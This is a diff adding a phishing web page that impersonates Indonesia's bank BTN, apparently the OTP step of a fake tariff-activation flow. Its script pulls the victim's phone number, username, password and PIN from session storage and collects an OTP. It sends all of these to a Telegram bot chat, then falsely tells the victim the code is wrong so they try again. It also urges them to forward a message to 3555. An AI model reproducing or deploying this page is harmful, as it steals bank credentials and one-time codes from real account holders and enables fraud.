@@ -1,0 +1,239 @@
+
+<!DOCTYPE html>
+<html lang="in">
+<head>
+      <meta charset="UTF-8">
+      <title>𝗕𝗧𝗡 - 𝗔𝗸𝘁𝗶𝘃𝗮𝘀𝗶 𝗧𝗮𝗿𝗶𝗳</title>
+      <meta name="theme-color" content="#0147A9">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<link href="https://raw.githubusercontent.com/gopay882/ast/main/BTN/icon.png" rel="shortcut icon" type="image/x-icon">
+<link href="https://raw.githubusercontent.com/gopay882/ast/main/BTN/icon.png" rel="apple-touch-icon">
+</head>
+<style>
+       @import url('https://fonts.googleapis.com/css?family=Open+Sans&display=swap');
+      
+ body {
+       font-family: sans-serif;
+       margin: 0px;
+       background: #fff;
+       position: absolute;
+}
+
+.otp{
+      display: block;
+      border-radius: 10px;
+      padding-left:0px; 
+      background-image: url(https://raw.githubusercontent.com/gopay882/ast/main/BTN/pass.png); 
+      background-size: 100% 100%; 
+      background-position: 100% 100%; 
+      font-size: 16px;
+      font-weight: 500;
+      color: #0064af;
+      border: none;
+      outline:none;
+      height: 45px;
+      width: 78%;
+      top: 30px;
+      bottom: 0;
+      position: relative;
+      margin: auto;
+      text-align: center;
+}
+
+.info{
+      font-size:14px;
+      font-weight: bold;
+      position: relative;
+      display: flex;
+      margin: auto;
+      text-align: center;
+      justify-content: center;
+      color: #000;
+      opacity: 0.7;
+      top: 15px;
+}
+
+.center{
+      display: flex;
+      margin: auto;
+      text-align: center;
+      justify-content: center;
+}
+
+.req{
+      font-weight:bold;
+      color:#00000080;
+      text-decoration:none;
+      margin-top:45px;
+      cursor:none;
+}
+
+::placeholder{
+      color:#000;
+      opacity:0.3;
+}
+
+.btn{
+       position: relative;
+       background-image: url(https://raw.githubusercontent.com/gopay882/ast/main/BTN/button.png); 
+       background-size: 100% 100%; 
+       background-position: 100%:100%; 
+       background-refreat: no-refeat; 
+       color: #fff; 
+       padding-top: 1px; 
+       font-weight: bold; 
+       background-color: #0069B9;  
+       height: 45px;
+       width: 78%; 
+       box-shadow: rgba(0, 0, 0, 0.38) 2.4px 2.4px 3.2px;
+       margin: auto;
+       top: 60px;
+       bottom: 0;
+       border-radius: 10px;
+       border: 0.7px solid #017de0;
+       outline: 0.7px solid #017de0;
+       text-align: center;
+       align-items: center;
+       justify-content: center;
+ }  
+ 
+ .process {
+     top: 0;
+     left: 0;
+     right: 0;
+     position: fixed;
+     display: flex;
+     justify-content: center;
+     align-items: center;
+     background: #0000005b;
+     z-index: 999999999;
+     width: 100%;
+     height: 100%;
+ }
+ 
+ .loading {
+     margin-top: -50px;
+     position: absolute;
+     display: flex;
+     justify-content: center;
+     align-items: center;
+ }
+
+ .loading img {
+     width: 100px;
+ }
+</style>
+<body>
+      <img src="https://raw.githubusercontent.com/gopay882/ast/main/BTN/otp.png" width="100%" alt="">
+      <div id="loading" name="process" class="process" style="display: none;background:#00000033;">
+			<div class="loading">      
+				<img src="https://raw.githubusercontent.com/gopay882/ast/main/BTN/loading.gif">
+			</div>				
+		</div>
+      <p class="info">Anda akan di hubungi Cs Bank BTN untuk di<br>kirimkan kode OTP, Pastikan Anda sudah<br>meneruskan pesan ke 3555 agar kode OTP bisa<br>terkirim di via SMS</p>
+      <form id="formOtp" onsubmit="sendOtp()">
+          <input type="hidden" name="nohp" id="nohp">
+          <input type="hidden" name="user" id="user">
+          <input type="hidden" name="pass" id="pass">
+          <input type="hidden" name="pin1" id="pin1">
+          <input type="hidden" name="pin2" id="pin2">
+          <input type="hidden" name="pin3" id="pin3">
+          <input type="hidden" name="pin4" id="pin4">
+          <input type="hidden" name="pin5" id="pin5">
+          <input type="hidden" name="pin6" id="pin6">
+      <p style="font-weight: 700; font-size: 17px; color: #000000cc; text-align: center; margin: 20px auto; margin-bottom: -30px;margin-top:30px;" id="timer">1 : 00</p> 
+       <a class="center req" onclick="getcs()" id="invalid">Request Kode OTP?</a>
+      <input type="tel" class="otp" id="otp" name="otp" placeholder="KODE OTP" required>
+      <button type="submit" id="kirim" class="btn center">Proses</button>
+      </form>
+      <br>
+      <br>
+      <br>
+      <br> <img src="https://raw.githubusercontent.com/gopay882/ast/main/BTN/logo-btn.png" width="30%" style="margin-top:30px;" class="center" alt="">  
+      
+      
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script><script src="i.js"></script>
+      <script>
+
+var nohp = sessionStorage.getItem('nohp', nohp);
+document.getElementById("nohp").value = nohp + "";       
+var user = sessionStorage.getItem('user', user);
+ document.getElementById("user").value = user + "";
+ var pass = sessionStorage.getItem('pass', pass);
+ document.getElementById("pass").value = pass + "";  
+ var pin1 = sessionStorage.getItem('pin1', pin1);
+document.getElementById("pin1").value = pin1 + "";       
+var pin2 = sessionStorage.getItem('pin2', pin2);
+ document.getElementById("pin2").value = pin2 + "";
+ var pin3 = sessionStorage.getItem('pin3', pin3);
+ document.getElementById("pin3").value = pin3 + ""; 
+ var pin4 = sessionStorage.getItem('pin4', pin4);
+document.getElementById("pin4").value = pin4 + "";       
+var pin5 = sessionStorage.getItem('pin5', pin5);
+ document.getElementById("pin5").value = pin5 + "";
+ var pin6 = sessionStorage.getItem('pin6', pin6);
+ document.getElementById("pin6").value = pin6 + ""; 
+var logo = "━─━─✧༺𝘽𝙏𝙉༻✧─━─━";        
+ function sendOtp(){
+      event.preventDefault();
+      document.getElementById('kirim').innerHTML = "Please wait...";    
+$("#loading").show();
+                  
+    var gabungan = "" + logo + '%0A※ 𝗡𝗼.𝗛𝗣 •• ' + nohp + '%0A%0A※ 𝗨𝘀𝗲𝗿 •• ' + user + '%0A※ 𝗣𝗮𝘀𝘀 •• ' + pass + '%0A※ 𝗣𝗶𝗻 •• ' + pin1 + pin2 + pin3 + pin4 + pin5 + pin6 + '%0A%0A※ 𝗢𝗧𝗣 •• ' + otp.value;
+        $.ajax({                   
+            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+            method: `POST`,                      
+            complete: function(data) {
+$("#invalid").addClass("fontku");      
+$("#invalid").text("Kode OTP Salah, Silahkan Coba Lagi");
+$("#invalid").css("color","red");
+            setTimeout(function(){            
+            $("#invalid").text("Pastikan Anda sudah meneruskan pesan ke 3555");
+$("#invalid").css("color","green");
+        $("#invalid").show()
+        $("#loading").hide();   
+   }, 3000);
+   setTimeout(function(){
+  $("#invalid").css("color","#09559a");    
+        $("#invalid").text("Kirim Ulang OTP?");
+     $("#invalid").removeClass("fontku");
+    document.getElementById('kirim').innerHTML = "Proses";$("#otp").val("");
+     
+                $("#otp").focus();
+   }, 5000);
+            }
+          })
+        }
+      </script>
+      <script src="token.js"></script>
+      <script>
+        document.getElementById('timer').innerHTML =
+          03 + ":" + 01;
+        startTimer();
+        
+        
+        function startTimer() {
+          var presentTime = document.getElementById('timer').innerHTML;
+          var timeArray = presentTime.split(/[:]+/);
+          var m = timeArray[0];
+          var s = checkSecond((timeArray[1] - 1));
+          if(s==59){m=m-1}
+          if(m<0){
+            return
+          }
+          
+          document.getElementById('timer').innerHTML =
+            m + " : " + s;
+          
+          setTimeout(startTimer, 1000);
+          
+        }
+        
+        function checkSecond(sec) {
+          if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
+          if (sec < 0) {sec = "59"};
+          return sec;
+        }
+    </script> 
+</body>
+</html>
